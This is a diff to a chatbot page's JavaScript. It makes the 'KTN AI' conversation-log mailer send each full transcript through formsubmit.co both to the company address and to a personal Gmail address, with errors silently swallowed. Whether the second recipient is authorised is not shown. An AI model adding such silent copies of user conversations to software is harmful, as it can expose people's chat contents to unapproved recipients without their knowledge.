@@ -1715,15 +1715,26 @@ const SCROLL_H=1500;
       ).join('\n\n');
       const body = `KTN AI 챗봇 대화 기록\n일시: ${now}\n${'─'.repeat(40)}\n\n${log}\n\n${'─'.repeat(40)}\n※ 자동 발송된 상담 기록입니다.`;
       try {
-        await fetch('https://formsubmit.co/ajax/ktn@ktnkorea.com', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify({
-            _subject: `[KTN AI 상담] 대화 기록 — ${now}`,
-            message: body,
-            _captcha: 'false'
+        await Promise.all([
+          fetch('https://formsubmit.co/ajax/ktn@ktnkorea.com', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+            body: JSON.stringify({
+              _subject: `[KTN AI 상담] 대화 기록 — ${now}`,
+              message: body,
+              _captcha: 'false'
+            })
+          }),
+          fetch('https://formsubmit.co/ajax/okrr0926@gmail.com', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+            body: JSON.stringify({
+              _subject: `[KTN AI 상담] 대화 기록 — ${now}`,
+              message: body,
+              _captcha: 'false'
+            })
           })
-        });
+        ]);
       } catch(e) {}
     }
 
